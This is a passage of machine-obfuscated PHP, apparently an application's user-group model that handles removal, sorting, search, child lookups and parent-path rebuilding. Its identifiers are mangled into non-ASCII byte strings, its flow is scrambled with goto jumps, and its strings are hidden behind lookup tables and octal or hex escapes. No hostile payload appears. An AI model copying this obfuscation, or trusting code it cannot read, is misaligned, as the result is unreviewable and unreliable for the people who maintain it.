$bÔæ¸°§¬¯[2114]); } $E¾ÎÁÌã÷[] = $e…Û…Û˜‰ğ[$bÔæ¸°§¬¯[2114]]; $A™ÑÉ»‡‘æ = array(); goto bŠ¥ô·ÙÚˆ; bŠ¥ô·ÙÚˆ: foreach ($E¾ÎÁÌã÷ as $eÅ¦®Õ¢ÄÁ) { $A™ÑÉ»‡‘æ[] = array($bÔæ¸°§¬¯[2114] => $eÅ¦®Õ¢ÄÁ, $bÔæ¸°§¬¯[99] => $bÔæ¸°§¬¯[698], $bÔæ¸°§¬¯[368] => $C¹ƒ¶ãŒ–æ); } return Model($bÔæ¸°§¬¯[2192])->addAll($A™ÑÉ»‡‘æ, array(), !0); goto E¡ê‡…ˆÒä; E¡ê‡…ˆÒä: } protected function groupRemove($B³êÈ—À») { goto Bê¢Õ„ÍÉ; BØ»ùâÒ˜÷: $this->where(array($E÷¤¿éáÉ[472] => $B³êÈ—À»))->save(array($E÷¤¿éáÉ[472] => $cÁî˜·æ[$E÷¤¿éáÉ[472]])); Model($E÷¤¿éáÉ[2192])->where($b¡Ë×ÔãäÏ)->delete(); Model($E÷¤¿éáÉ[2193])->where($b¡Ë×ÔãäÏ)->delete(); goto D«‹ÈÁ¸ôŠ; Bê¢Õ„ÍÉ: $E÷¤¿éáÉ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b¡Ë×ÔãäÏ = array($E÷¤¿éáÉ[2114] => $B³êÈ—À»); $cÁî˜·æ = $this->where($b¡Ë×ÔãäÏ)->find(); goto E¿ÃßÑ; D«‹ÈÁ¸ôŠ: Model($E÷¤¿éáÉ[761])->groupRootRemove($B³êÈ—À»); return $this->where($b¡Ë×ÔãäÏ)->delete(); goto A¥„äÙ“˜î; E¿ÃßÑ: if (!$cÁî˜·æ || $cÁî˜·æ[$E÷¤¿éáÉ[472]] == 0) { return !1; } $d ¿ó‹¼İâ = $this->getInfoSimple($cÁî˜·æ[$E÷¤¿éáÉ[472]]); $this->_changeChildLevel($cÁî˜·æ, $d ¿ó‹¼İâ, !0); goto BØ»ùâÒ˜÷; A¥„äÙ“˜î: } protected function groupSort($C„®è¿…°ª) { $d«‘Ÿè—ƒÂ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DÌÈ–ÑÍÙã = array(); foreach ($C„®è¿…°ª as $BîÜì§•Õ => $A«öÏÃªÑ) { $DÌÈ–ÑÍÙã[] = array($d«‘Ÿè—ƒÂ[2114], $A«öÏÃªÑ, $d«‘Ÿè—ƒÂ[2136], $BîÜì§•Õ + 1); } $this->saveAll($DÌÈ–ÑÍÙã); } public function listData() { $BÖŞ´°ï²„ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($BÖŞ´°ï²„[$_SERVER[çŞáÓæÚô‚Ô‡][363]]); return $BÖŞ´°ï²„; } private function _makeOrder($eğ†ÀˆºË = '') { goto AÈÒ©°²ÎÍ; AÈÒ©°²ÎÍ: $Eô‚±²›ã· =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aÄØŠƒ¥± = array($Eô‚±²›ã·[2114], $Eô‚±²›ã·[38], $Eô‚±²›ã·[2100], $Eô‚±²›ã·[197]); $aˆÔõôô = array($Eô‚±²›ã·[411] => $Eô‚±²›ã·[412], $Eô‚±²›ã·[413] => $Eô‚±²›ã·[414]); goto EÑŒ×öá‰“; D‡÷½æÀ¶: $eğ†ÀˆºË = $eğ†ÀˆºË . "{$Aà†öè‡‘ƒ}\40{$d·æ§÷ÆÇ}\54\40\147\162\x6f\165\x70\111\104\40\x61\x73\x63"; return $this->order($eğ†ÀˆºË); goto CÜ§™ğ—‡’; EÑŒ×öá‰“: $Aà†öè‡‘ƒ = Input::get($Eô‚±²›ã·[416], $Eô‚±²›ã·[17], $Eô‚±²›ã·[2118], $aÄØŠƒ¥±); $d·æ§÷ÆÇ = Input::get($Eô‚±²›ã·[417], $Eô‚±²›ã·[17], $Eô‚±²›ã·[2194], array($Eô‚±²›ã·[2194], $Eô‚±²›ã·[413])); $d·æ§÷ÆÇ = $aˆÔõôô[$d·æ§÷ÆÇ]; goto D‡÷½æÀ¶; CÜ§™ğ—‡’: } public function listChild($A—ƒ×„•ÒÕ) { $F¨ê•Ó†á§ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CÊÜÊ°½‘¦ = $this->where(array($F¨ê•Ó†á§[472] => $A—ƒ×„•ÒÕ))->_makeOrder()->selectPage(200); $this->_listDataApply($CÊÜÊ°½‘¦[$F¨ê•Ó†á§[363]]); return $CÊÜÊ°½‘¦; } public function listByID($D×‹¹ææÃÀ) { $e¿™›ÂÂ¹š =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$D×‹¹ææÃÀ) { return array(); } $E°—­Î£„‘ = array($e¿™›ÂÂ¹š[2114] => array($e¿™›ÂÂ¹š[17], $D×‹¹ææÃÀ)); $DÖï‹¶Ì = $this->where($E°—­Î£„‘)->select(); $this->_listDataApply($DÖï‹¶Ì); return $DÖï‹¶Ì; } public function listSearch($FÇ“Ì×óøâ) { goto Bö—÷†¯¹İ; fÎ¶´ôÉ¡Æ: if (!$C‡§¸µ§Œî || count($C‡§¸µ§Œî[$eñÕ·”ÊæÄ[363]]) < 5 && Input::check($eŠŠˆ©Š©•, $eñÕ·”ÊæÄ[315])) { goto f‡‹‘Ñğéõ; f‡‹‘Ñğéõ: $dÆ÷™†®» = $this->groupChildrenAll($eÁ‰Ç„‹ù); $C‰ªè¶ÌÒ‹ = $this->_searchFromMeta($eñÕ·”ÊæÄ[424], $eŠŠˆ©Š©•, 10, $dÆ÷™†®»); $CŠÉ ºª = $this->_searchFromMeta($eñÕ·”ÊæÄ[425], $eŠŠˆ©Š©•, 10, $dÆ÷™†®»); goto EÙ¢Ÿ¨ùï; EÙ¢Ÿ¨ùï: $c¨Ú‰„áİ® = array_merge($C‰ªè¶ÌÒ‹, $CŠÉ ºª, $C‡§¸µ§Œî[$eñÕ·”ÊæÄ[363]]); $C‡§¸µ§Œî[$eñÕ·”ÊæÄ[363]] = array_unique_by_key($c¨Ú‰„áİ®, $eñÕ·”ÊæÄ[2114]); $C‡§¸µ§Œî[$eñÕ·”ÊæÄ[360]][$eñÕ·”ÊæÄ[361]] = count($C‡§¸µ§Œî[$eñÕ·”ÊæÄ[363]]); goto eÄ½ß•¿™; eÄ½ß•¿™: $C‡§¸µ§Œî[$eñÕ·”ÊæÄ[360]][$eñÕ·”ÊæÄ[362]] = ceil($C‡§¸µ§Œî[$eñÕ·”ÊæÄ[360]][$eñÕ·”ÊæÄ[361]] / $C‡§¸µ§Œî[$eñÕ·”ÊæÄ[360]][$eñÕ·”ÊæÄ[358]]); goto cÆÆ†‚Ü®Ë; cÆÆ†‚Ü®Ë: } $this->_listDataApply($C‡§¸µ§Œî[$eñÕ·”ÊæÄ[363]]); return $C‡§¸µ§Œî; goto CÇæÍòŒ¯‹; Bö—÷†¯¹İ: $eñÕ·”ÊæÄ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eŠŠˆ©Š©• = $FÇ“Ì×óøâ[$eñÕ·”ÊæÄ[2195]]; $eÁ‰Ç„‹ù = isset($FÇ“Ì×óøâ[$eñÕ·”ÊæÄ[2196]]) ? $FÇ“Ì×óøâ[$eñÕ·”ÊæÄ[2196]] : !1; goto Fã¿è¡ÛÀÙ; Fôƒ›Õ††š: if ($eÁ‰Ç„‹ù) { $b²½æ¸Ò = $this->getInfoSimple($eÁ‰Ç„‹ù); $CÕ²›©…› = $b²½æ¸Ò[$eñÕ·”ÊæÄ[470]] . $eÁ‰Ç„‹ù . $eñÕ·”ÊæÄ[495]; $fëåÑÜ— = array($fëåÑÜ—, array($eñÕ·”ÊæÄ[470] => array($eñÕ·”ÊæÄ[760], $CÕ²›©…›))); } $C‡§¸µ§Œî = $this->_makeOrder()->where($fëåÑÜ—)->selectPage(20); $C‡§¸µ§Œî = $C‡§¸µ§Œî ? $C‡§¸µ§Œî : array(); goto fÎ¶´ôÉ¡Æ; Fã¿è¡ÛÀÙ: if (!trim($eŠŠˆ©Š©•)) { return !1; } $eŠŠˆ©Š©• = str_replace($eñÕ·”ÊæÄ[2197], $eñÕ·”ÊæÄ[2198], $eŠŠˆ©Š©•); $fëåÑÜ— = array($eñÕ·”ÊæÄ[2114] => array($eñÕ·”ÊæÄ[760], "\45{$eŠŠˆ©Š©•}\x25"), $eñÕ·”ÊæÄ[38] => array($eñÕ·”ÊæÄ[760], "\45{$eŠŠˆ©Š©•}\45"), $eñÕ·”ÊæÄ[920] => $eñÕ·”ÊæÄ[2199]); goto Fôƒ›Õ††š; CÇæÍòŒ¯‹: } protected function groupChildrenAll($EÌÒåš‹Š³) { $C…åÎ½Ç =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$EÌÒåš‹Š³) { return !1; } if (is_string($EÌÒåš‹Š³)) { $EÌÒåš‹Š³ = array($EÌÒåš‹Š³); } $aÎø³ò¥ = $EÌÒåš‹Š³; foreach ($EÌÒåš‹Š³ as $b÷ˆ…ˆÍè) { $fàõëğ™ = $this->getInfoSimple($b÷ˆ…ˆÍè); $aĞçñ…²…ö = array($C…åÎ½Ç[470] => array($C…åÎ½Ç[760], $fàõëğ™[$C…åÎ½Ç[470]] . $b÷ˆ…ˆÍè . $C…åÎ½Ç[495])); $f Ú‚í«îµ = $this->field($C…åÎ½Ç[2114])->where($aĞçñ…²…ö)->select(); $aÎø³ò¥ = array_merge($aÎø³ò¥, array_to_keyvalue($f Ú‚í«îµ, $C…åÎ½Ç[43], $C…åÎ½Ç[2114])); } return array_unique($aÎø³ò¥); } private function _searchFromMeta($EÅƒÎİµ§®, $f©ëÇ‚ŒÒ, $AÈ‡ó‡‡ìÊ, $D†¹Š×ê™) { goto a¯–éÃÔëœ; dãËÖğ×ï…: return $bƒ¶ŒÛ‡ç; goto bÈ‘Ò™éˆ¥; BãÊ¨£Ç™: $D¡ß¼é¨Š = array_to_keyvalue($D¡ß¼é¨Š, $a”äÆˆß¾Ù[43], $a”äÆˆß¾Ù[2114]); $bƒ¶ŒÛ‡ç = $this->where(array($a”äÆˆß¾Ù[2191] => array($a”äÆˆß¾Ù[17], $D¡ß¼é¨Š)))->select(); if (!$bƒ¶ŒÛ‡ç) { return array(); } goto dãËÖğ×ï…; a¯–éÃÔëœ: $a”äÆˆß¾Ù =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f©ëÇ‚ŒÒ = strtolower($f©ëÇ‚ŒÒ); $Aé–¹±‰…‡ = array($a”äÆˆß¾Ù[99] => $EÅƒÎİµ§®, $a”äÆˆß¾Ù[368] => array($a”äÆˆß¾Ù[760], "\45{$f©ëÇ‚ŒÒ}\45")); goto c»ßêš¿¶º; c»ßêš¿¶º: if ($D†¹Š×ê™) { $Aé–¹±‰…‡[$a”äÆˆß¾Ù[2114]] = array($a”äÆˆß¾Ù[17], $D†¹Š×ê™); } $D¡ß¼é¨Š = Model($a”äÆˆß¾Ù[2200])->where($Aé–¹±‰…‡)->limit($AÈ‡ó‡‡ìÊ)->select(); if (!$D¡ß¼é¨Š) { return array(); } goto BãÊ¨£Ç™; bÈ‘Ò™éˆ¥: } protected function _listDataApplyItem($C›«Ì‡˜°¤) { $bêó»¸Ó–ù = array($C›«Ì‡˜°¤); $this->_listDataApply($bêó»¸Ó–ù); return $bêó»¸Ó–ù[0]; } protected function _listDataApply(&$BÂŞ´¬Óƒ) { goto CñÁ›¯êˆ; C½÷ö«à´ø: $this->_listAppendParent($BÂŞ´¬Óƒ); $this->_listAppendSourceRoot($BÂŞ´¬Óƒ, $fÁø”Ìİ); goto CÎñ¨ÊÉˆ; CñÁ›¯êˆ: $cò¦ÊÛ·ÈÔ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$BÂŞ´¬Óƒ) { return; } $fÁø”Ìİ = array_to_keyvalue($BÂŞ´¬Óƒ, $cò¦ÊÛ·ÈÔ[43], $cò¦ÊÛ·ÈÔ[2114]); goto dÙôí¢‚…¡; dÙôí¢‚…¡: $this->_listAppendChildren($BÂŞ´¬Óƒ); $this->_listAppendChildrenMember($BÂŞ´¬Óƒ); $this->_listAppendMeta($BÂŞ´¬Óƒ, $fÁø”Ìİ); goto C½÷ö«à´ø; CÎñ¨ÊÉˆ: } private function _listAppendChildren(&$d¬ÙÂÎÅø) { goto eĞÈÌã†¤; eĞÈÌã†¤: $EÓáùÀ–ã =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dÑ½é†˜³Š = $EÓáùÀ–ã[370]; $cˆÕ¼ù½“à = array(); goto BÇÂ¼³›İ’; f¿“—îøõì: $cˆÕ¼ù½“à = array_to_keyvalue($cˆÕ¼ù½“à, $EÓáùÀ–ã[461]); foreach ($d¬ÙÂÎÅø as &$a……äÌé) { $a……äÌé[$EÓáùÀ–ã[2201]] = isset($cˆÕ¼ù½“à[$a……äÌé[$EÓáùÀ–ã[2114]] . $EÓáùÀ–ã[2202]]); } unset($a……äÌé); goto A©ÃµÁº—«; BÇÂ¼³›İ’: $BÙ¹ğõ£Ü÷ = count($d¬ÙÂÎÅø); $Aßƒšã„”î = $this->tablePrefix . $this->tableName; for ($a‡‹‰î¦¥ò = 0, $CÅŒ‘¥áó° = 0; $a‡‹‰î¦¥ò < $BÙ¹ğõ£Ü÷; $a‡‹‰î¦¥ò++) { $CÅŒ‘¥áó°++; $A¡í‡µ…é = $d¬ÙÂÎÅø[$a‡‹‰î¦¥ò][$EÓáùÀ–ã[2114]]; $dÑ½é†˜³Š .= "\123\105\x4c\x45\103\124\x20\x2a\40\x46\x52\x4f\115\40\50\123\x45\x4c\105\x43\124\40\x27{$A¡í‡µ…é}\x5f\143\150\151\154\x64\x27\x20\x61\x73\40\x68\x61\x73\40\106\122\117\x4d\x20\140{$Aßƒšã„”î}\140\40\x77\x68\145\x72\145\40\160\x61\x72\145\x6e\x74\x49\104\75{$A¡í‡µ…é}\40\154\x69\x6d\151\164\x20\61\x29\40\141\x73\x20\164\x62\137{$A¡í‡µ…é}\x20\x75\x6e\x69\x6f\x6e\40\x61\x6c\x6c\40"; if (($CÅŒ‘¥áó° >= 20 || $a‡‹‰î¦¥ò == $BÙ¹ğõ£Ü÷ - 1) && $dÑ½é†˜³Š) { $dÑ½é†˜³Š = substr($dÑ½é†˜³Š, 0, -strlen($EÓáùÀ–ã[460])); $fÙ‘ø‚” à = $this->query($dÑ½é†˜³Š); $cˆÕ¼ù½“à = array_merge($cˆÕ¼ù½“à, $fÙ‘ø‚” à); $CÅŒ‘¥áó° = 0; $dÑ½é†˜³Š = $EÓáùÀ–ã[43]; } } goto f¿“—îøõì; A©ÃµÁº—«: } private function _listAppendChildrenMember(&$C¢í¾ë¥) { goto FÅ­¼ìÅ¹—; C±­¸¾ä™: $a«¡ñÌ”‘É = count($C¢í¾ë¥); $cø«éÂŸù = $this->tablePrefix . $EÛß¿óìÕ§[2193]; for ($d¯·Ù”åËØ = 0, $fó¡Á¤´½ = 0; $d¯·Ù”åËØ < $a«¡ñÌ”‘É; $d¯·Ù”åËØ++) { $fó¡Á¤´½++; $b½ô–æ§ƒÑ = $C¢í¾ë¥[$d¯·Ù”åËØ][$EÛß¿óìÕ§[2114]]; $f÷ë¥Š´îë .= "\x53\105\x4c\x45\103\124\x20\x2a\x20\x46\122\117\115\40\50\123\x45\x4c\105\x43\124\40\x27{$b½ô–æ§ƒÑ}\x5f\x63\150\151\x6c\x64\47\40\x61\163\40\x68\x61\x73\40\x46\122\117\x4d\x20\140{$cø«éÂŸù}\x60\x20\167\150\x65\x72\x65\x20\x67\162\157\x75\x70\111\x44\75{$b½ô–æ§ƒÑ}\x20\x6c\x69\x6d\151\164\x20\61\x29\40\141\x73\x20\x74\142\x5f{$b½ô–æ§ƒÑ}\x20\165\x6e\151\x6f\x6e\40\x61\x6c\154\x20"; if (($fó¡Á¤´½ >= 20 || $d¯·Ù”åËØ == $a«¡ñÌ”‘É - 1) && $f÷ë¥Š´îë) { $f÷ë¥Š´îë = substr($f÷ë¥Š´îë, 0, -strlen($EÛß¿óìÕ§[460])); $C·Ë±…„Ñ = $this->query($f÷ë¥Š´îë); $dÔùƒ ‹•É = array_merge($dÔùƒ ‹•É, $C·Ë±…„Ñ); $fó¡Á¤´½ = 0; $f÷ë¥Š´îë = $EÛß¿óìÕ§[43]; } } goto B£ã§Å¯´Á; B£ã§Å¯´Á: $dÔùƒ ‹•É = array_to_keyvalue($dÔùƒ ‹•É, $EÛß¿óìÕ§[461]); foreach ($C¢í¾ë¥ as &$bÀ§ŸÖ˜‰Ò) { $bÀ§ŸÖ˜‰Ò[$EÛß¿óìÕ§[2203]] = isset($dÔùƒ ‹•É[$bÀ§ŸÖ˜‰Ò[$EÛß¿óìÕ§[2114]] . $EÛß¿óìÕ§[2202]]); } unset($bÀ§ŸÖ˜‰Ò); goto EÓÄç¦Ø‹; FÅ­¼ìÅ¹—: $EÛß¿óìÕ§ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f÷ë¥Š´îë = $EÛß¿óìÕ§[370]; $dÔùƒ ‹•É = array(); goto C±­¸¾ä™; EÓÄç¦Ø‹: } private function _listAppendMeta(&$bÎ™®Ş‚ÒÌ, $E¦›¯ŞîÔÌ) { goto aíÃ×Æá; f·£°‡öìµ: foreach ($bÎ™®Ş‚ÒÌ as &$eïõÎŠè©Ğ) { $eïõÎŠè©Ğ[$bÆĞùƒÌâª[426]] = array(); if (isset($AĞ»ÉÓ …”[$eïõÎŠè©Ğ[$bÆĞùƒÌâª[2114]]])) { $eïõÎŠè©Ğ[$bÆĞùƒÌâª[426]] = $AĞ»ÉÓ …”[$eïõÎŠè©Ğ[$bÆĞùƒÌâª[2114]]]; } } unset($eïõÎŠè©Ğ); goto f£˜ª™Û¦ù; aâóÄ‰Â¹ö: $AĞ»ÉÓ …” = array_to_keyvalue_group($AĞ»ÉÓ …”, $bÆĞùƒÌâª[2114]); foreach ($AĞ»ÉÓ …” as &$eå‡‹óÚ º) { $eå‡‹óÚ º = array_to_keyvalue($eå‡‹óÚ º, $bÆĞùƒÌâª[99], $bÆĞùƒÌâª[368]); } unset($eå‡‹óÚ º); goto f·£°‡öìµ; aíÃ×Æá: $bÆĞùƒÌâª =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B½¥°Ö¡Ğ„ = array($bÆĞùƒÌâª[2114] => array($bÆĞùƒÌâª[17], $E¦›¯ŞîÔÌ)); $AĞ»ÉÓ …” = Model($bÆĞùƒÌâª[2192])->where($B½¥°Ö¡Ğ„)->select(); goto aâóÄ‰Â¹ö; f£˜ª™Û¦ù: } protected function parentLevelArray($Aİ›ğÙ¶Ÿ) { $cÒÌ¬¤ˆ—Ó =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Aİ›ğÙ¶Ÿ = explode($cÒÌ¬¤ˆ—Ó[57], trim($Aİ›ğÙ¶Ÿ, $cÒÌ¬¤ˆ—Ó[57])); $Aİ›ğÙ¶Ÿ = array_remove_value($Aİ›ğÙ¶Ÿ, $cÒÌ¬¤ˆ—Ó[479]); return $Aİ›ğÙ¶Ÿ; } private function _listAppendParent(&$AæöŠÊ­õ) { goto B´äöÂø¸Ş; a‹­ÎÚäÓŒ: unset($f©çÒƒî‡é); goto cŠé¤æµ‚æ; FÂã¤ãí…£: unset($f©çÒƒî‡é); $AÓº¼¼®´Ì = array(); foreach ($a½ù²ÜŞ× as $F‚Û¾ğ²Ïø => $E¡ØâŸ×ñ) { if (!$E¡ØâŸ×ñ) { $AÓº¼¼®´Ì[] = $F‚Û¾ğ²Ïø; } } goto dØŒšÃÜ¨÷; B´äöÂø¸Ş: $bŸ¬å¥Ø£“ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a½ù²ÜŞ× = array(); foreach ($AæöŠÊ­õ as &$f©çÒƒî‡é) { $a½ù²ÜŞ×[$f©çÒƒî‡é[$bŸ¬å¥Ø£“[2114]]] = $f©çÒƒî‡é[$bŸ¬å¥Ø£“[38]]; $e¶ì›ˆ†ï½ = $this->parentLevelArray($f©çÒƒî‡é[$bŸ¬å¥Ø£“[470]]); foreach ($e¶ì›ˆ†ï½ as $F”ª¾†Ë‰Û) { if (!isset($a½ù²ÜŞ×[$F”ª¾†Ë‰Û])) { $a½ù²ÜŞ×[$F”ª¾†Ë‰Û] = 0; } } } goto FÂã¤ãí…£; dØŒšÃÜ¨÷: if ($AÓº¼¼®´Ì) { $AŸ‡¯«èÔ = array($bŸ¬å¥Ø£“[2191] => array($bŸ¬å¥Ø£“[393], $AÓº¼¼®´Ì)); $Eó£ñ§æ´ = $this->field($bŸ¬å¥Ø£“[2204])->where($AŸ‡¯«èÔ)->select(); $FˆÇ©ÆÍÕ’ = array_to_keyvalue($Eó£ñ§æ´, $bŸ¬å¥Ø£“[2114], $bŸ¬å¥Ø£“[38]); $a½ù²ÜŞ× = array_merge_index($a½ù²ÜŞ×, $FˆÇ©ÆÍÕ’); } $c³¶ğè´äù = $GLOBALS[$bŸ¬å¥Ø£“[16]][$bŸ¬å¥Ø£“[94]][$bŸ¬å¥Ø£“[2205]]; foreach ($AæöŠÊ­õ as &$f©çÒƒî‡é) { $e¶ì›ˆ†ï½ = $this->parentLevelArray($f©çÒƒî‡é[$bŸ¬å¥Ø£“[470]]); $AÆö¡‰„ö = $bŸ¬å¥Ø£“[43]; foreach ($e¶ì›ˆ†ï½ as $F‚Û¾ğ²Ïø => $F”ª¾†Ë‰Û) { if ($c³¶ğè´äù && $F‚Û¾ğ²Ïø == 0) { continue; } $AÆö¡‰„ö .= $a½ù²ÜŞ×[$F”ª¾†Ë‰Û] . $bŸ¬å¥Ø£“[18]; } if ($e¶ì›ˆ†ï½) { $AÆö¡‰„ö .= $f©çÒƒî‡é[$bŸ¬å¥Ø£“[38]]; } $f©çÒƒî‡é[$bŸ¬å¥Ø£“[474]] = str_replace($bŸ¬å¥Ø£“[478], $bŸ¬å¥Ø£“[18], $AÆö¡‰„ö); } goto a‹­ÎÚäÓŒ; cŠé¤æµ‚æ: } private function _listAppendSourceRoot(&$bãƒ°²¤¹«, $D­İ–à´œ„) { goto F¨òšğÎªâ; BÛ‚³šÇÜ‚: $CÕòÃâêìï = Model($c»¦ã¹Ğ[761])->order($c»¦ã¹Ğ[2207])->field($Aç¡ÅĞĞ™³)->where($EøÑ–ó °)->select(); $CÕòÃâêìï = array_to_keyvalue($CÕòÃâêìï, $c»¦ã¹Ğ[467]); $CÕòÃâêìï = array_remove_key($CÕòÃâêìï, $c»¦ã¹Ğ[467]); goto FğÇ¾Ñ¬®; FğÇ¾Ñ¬®: foreach ($bãƒ°²¤¹« as &$EÇ—¡Œ„ÅÒ) { $EÇ—¡Œ„ÅÒ[$c»¦ã¹Ğ[400]] = $CÕòÃâêìï[$EÇ—¡Œ„ÅÒ[$c»¦ã¹Ğ[2114]]] ? $CÕòÃâêìï[$EÇ—¡Œ„ÅÒ[$c»¦ã¹Ğ[2114]]] : array(); } unset($EÇ—¡Œ„ÅÒ); goto C‘’»¤ÄŸ; F¨òšğÎªâ: $c»¦ã¹Ğ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EøÑ–ó ° = array($c»¦ã¹Ğ[380] => SourceModel::TYPE_GROUP, $c»¦ã¹Ğ[472] => 0, $c»¦ã¹Ğ[467] => array($c»¦ã¹Ğ[17], $D­İ–à´œ„)); $Aç¡ÅĞĞ™³ = $c»¦ã¹Ğ[2206]; goto BÛ‚³šÇÜ‚; C‘’»¤ÄŸ: } protected function groupMerge($F˜âÏ¬©é¢) { $F˜âÏ¬©é¢ = array_values(array_unique($F˜âÏ¬©é¢)); $bï¶ŠŞƒæ¢ = array(); for ($EëøÌÆÕ˜ = 0; $EëøÌÆÕ˜ < count($F˜âÏ¬©é¢); $EëøÌÆÕ˜++) { $Aä‹‹ãù = !1; for ($dšïÅÔ‡„ = 0; $dšïÅÔ‡„ < count($F˜âÏ¬©é¢); $dšïÅÔ‡„++) { if ($EëøÌÆÕ˜ == $dšïÅÔ‡„) { continue; } if ($this->isParentOf($F˜âÏ¬©é¢[$dšïÅÔ‡„], $F˜âÏ¬©é¢[$EëøÌÆÕ˜])) { $Aä‹‹ãù = !0; break; } } if (!$Aä‹‹ãù) { $bï¶ŠŞƒæ¢[] = $F˜âÏ¬©é¢[$EëøÌÆÕ˜]; } } return $bï¶ŠŞƒæ¢; } protected function isParentOf($B¢¸õ‘Å¦, $Bæ¸Ëµİ±) { goto Aòƒ½‹Œ—ï; c‚§Ï°…£÷: $c™Ü‘Äöñ¡ = $this->getInfoSimple($Bæ¸Ëµİ±); $fÑƒ­ñÁéì = $CÅ—˜ã°ªÙ[$D÷‰¢ƒõæå[470]] . $B¢¸õ‘Å¦ . $D÷‰¢ƒõæå[57]; if (substr($c™Ü‘Äöñ¡[$D÷‰¢ƒõæå[470]], 0, strlen($fÑƒ­ñÁéì)) == $fÑƒ­ñÁéì) { return !0; } goto b¬Äêå²Ì…; b¬Äêå²Ì…: return !1; goto A±˜‹½; Aòƒ½‹Œ—ï: $D÷‰¢ƒõæå =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$B¢¸õ‘Å¦ || !$Bæ¸Ëµİ± || $B¢¸õ‘Å¦ == $Bæ¸Ëµİ±) { return !1; } $CÅ—˜ã°ªÙ = $this->getInfoSimple($B¢¸õ‘Å¦); goto c‚§Ï°…£÷; A±˜‹½: } public function groupShowRoot($aÙÁãİÆƒ, $C˜‚¤ëÆÓ = false) { goto BËŒÔ÷á °; aÆä‚È„£: if ($C˜‚¤ëÆÓ && count($B™®ç¯ØÅâ) == 1) { return $eº¼•Ôãİ; } if (!$EŞâÚÒ˜è[$f–İƒ·è¾¯[426]] || !isset($EŞâÚÒ˜è[$f–İƒ·è¾¯[426]][$f–İƒ·è¾¯[2189]]) || $EŞâÚÒ˜è[$f–İƒ·è¾¯[426]][$f–İƒ·è¾¯[2189]] == $f–İƒ·è¾¯[2163]) { return $this->groupShowRoot($B™®ç¯ØÅâ[count($B™®ç¯ØÅâ) - 1], $C˜‚¤ëÆÓ); } if ($EŞâÚÒ˜è[$f–İƒ·è¾¯[426]][$f–İƒ·è¾¯[2189]] == $f–İƒ·è¾¯[355]) { $dµ»©‘Ó… = explode($f–İƒ·è¾¯[57], $EŞâÚÒ˜è[$f–İƒ·è¾¯[426]][$f–İƒ·è¾¯[2190]]); if ($dµ»©‘Ó…) { $eº¼•Ôãİ = array_merge($eº¼•Ôãİ, $dµ»©‘Ó…); } } goto bÙ…‚‡¸×½; BËŒÔ÷á °: $f–İƒ·è¾¯ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EŞâÚÒ˜è = $this->getInfo($aÙÁãİÆƒ); if (!$EŞâÚÒ˜è) { return array(); } goto Aï¥ƒÌ¿ğÇ; bÙ…‚‡¸×½: return $eº¼•Ôãİ; goto DĞÎ•Ÿâ£À; Aï¥ƒÌ¿ğÇ: $B™®ç¯ØÅâ = $this->parentLevelArray($EŞâÚÒ˜è[$f–İƒ·è¾¯[470]]); $eº¼•Ôãİ = array($aÙÁãİÆƒ); if (count($B™®ç¯ØÅâ) == 0) { return $eº¼•Ôãİ; } goto aÆä‚È„£; DĞÎ•Ÿâ£À: } protected function resetParentLevel() { $B¿•Î«Ò™ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b…ƒÖôñ = $B¿•Î«Ò™[2114]; $BÜÇÄÏŞ¼“ = $this->select(); $BÜÇÄÏŞ¼“ = array_to_keyvalue($BÜÇÄÏŞ¼“, $b…ƒÖôñ); foreach ($BÜÇÄÏŞ¼“ as $Cˆ¯ ›ˆÏ) { goto Cœ¤Ÿ¦ø¡â; D¿é±ÎÑ”Ì: $CÄ»•³ƒÕĞ[] = 0; $CÄ»•³ƒÕĞ = $B¿•Î«Ò™[57] . implode($B¿•Î«Ò™[57], array_reverse($CÄ»•³ƒÕĞ)) . $B¿•Î«Ò™[57]; $this->setNamePinyin($Cˆ¯ ›ˆÏ[$b…ƒÖôñ], $Cˆ¯ ›ˆÏ[$B¿•Î«Ò™[38]]); goto F£Ÿ·èİŞ; Cœ¤Ÿ¦ø¡â: $d¯óÈÔ¨ò = $Cˆ¯ ›ˆÏ; $CÄ»•³ƒÕĞ = array(); while ($d¯óÈÔ¨ò[$B¿•Î«Ò™[472]] != 0) { $CÄ»•³ƒÕĞ[] = $d¯óÈÔ¨ò[$B¿•Î«Ò™[472]]; $d¯óÈÔ¨ò = $BÜÇÄÏŞ¼“[$d¯óÈÔ¨ò[$B¿•Î«Ò™[472]]]; } goto D¿é±ÎÑ”Ì; F£Ÿ·èİŞ: $this->where(array($b…ƒÖôñ => $Cˆ¯ ›ˆÏ[$b…ƒÖôñ]))->save(array($B¿•Î«Ò™[536] => $CÄ»•³ƒÕĞ)); goto eã°ù¬¾Ñ¡; eã°ù¬¾Ñ¡: } return $BÜÇÄÏŞ¼“; } public function groupNameAuto($DïÚÈ½”«¿, $fÌ´·¿·÷µ) { $DÌ‡‡’ğ„ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Cª¼Ëé«‚ = $this->where(array($DÌ‡‡’ğ„[377] => $DïÚÈ½”«¿))->getField($DÌ‡‡’ğ„[38], !0); if (!$Cª¼Ëé«‚ || !in_array($fÌ´·¿·÷µ, $Cª¼Ëé«‚)) { return $fÌ´·¿·÷µ; } for ($DòˆÍ™…ÅØ = 1; $DòˆÍ™…ÅØ <= count($Cª¼Ëé«‚) + 1; $DòˆÍ™…ÅØ++) { $d‰¨¯à×ÊÛ = $fÌ´·¿·÷µ . "\x28{$DòˆÍ™…ÅØ}\x29"; if (!in_array($d‰¨¯à×ÊÛ, $Cª¼Ëé«‚)) { return $d‰¨¯à×ÊÛ; } } } } class GroupTagModel extends ModelBase { protected $tableName = 